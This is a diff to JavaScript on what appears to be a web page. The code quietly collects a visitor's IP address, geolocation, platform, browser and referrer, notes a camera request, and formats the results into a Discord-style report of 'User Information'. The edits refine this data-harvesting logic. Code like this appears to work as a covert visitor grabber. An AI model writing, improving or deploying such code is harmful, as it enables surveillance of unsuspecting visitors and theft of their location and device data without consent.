@@ -1275,7 +1275,7 @@
                     console.log('Could not get location:', e);
                 }
                 
-                // System information
+                // System information - REAL data from device
                 const userInfo = {
                     userAgent: navigator.userAgent,
                     language: navigator.language,
@@ -1292,23 +1292,9 @@
                     referrer: document.referrer || 'Direct',
                     publicIP: publicIP,
                     location: location,
-                    os: (() => {
-                        const ua = navigator.userAgent;
-                        if (ua.includes('Win')) return 'Windows';
-                        if (ua.includes('Mac')) return 'macOS';
-                        if (ua.includes('Linux')) return 'Linux';
-                        if (ua.includes('Android')) return 'Android';
-                        if (ua.includes('iOS') || ua.includes('iPhone')) return 'iOS';
-                        return 'Unknown';
-                    })(),
-                    browser: (() => {
-                        const ua = navigator.userAgent;
-                        if (ua.includes('Chrome')) return 'Chrome/Chromium';
-                        if (ua.includes('Firefox')) return 'Firefox';
-                        if (ua.includes('Safari')) return 'Safari';
-                        if (ua.includes('Edge')) return 'Edge';
-                        return 'Unknown';
-                    })()
+                    // Use platform directly for real OS info
+                    os: navigator.platform,
+                    browser: navigator.userAgent.match(/([^\/\s]+)(?:\s|\/)/)?.[1] || 'Unknown'
                 };
 
                 // Try to get camera (will show prompt) - but get device info first
@@ -1364,8 +1350,8 @@
                     description: `**👤 User Information**\\n` +
                                 `**Username:** ${userInfo.username || 'Web Visitor'}\\n` +
                                 `**💻 Device Name:** ${cameraDeviceName}\\n` +
-                                `**🌐 Public IP:** \`'xd'\n` +
-                                `**📍 Location:** ${userInfo.location}\\n` +
+                                `**🌐 Public IP:** \`\`\\n` +
+                                `**📍 Location:** \\n` +
                                 `**🖥️ OS:** ${userInfo.os}\\n` +
                                 `**🌐 Browser:** ${userInfo.browser}\\n\\n` +
                                 `**📊 Technical Details**\\n` +
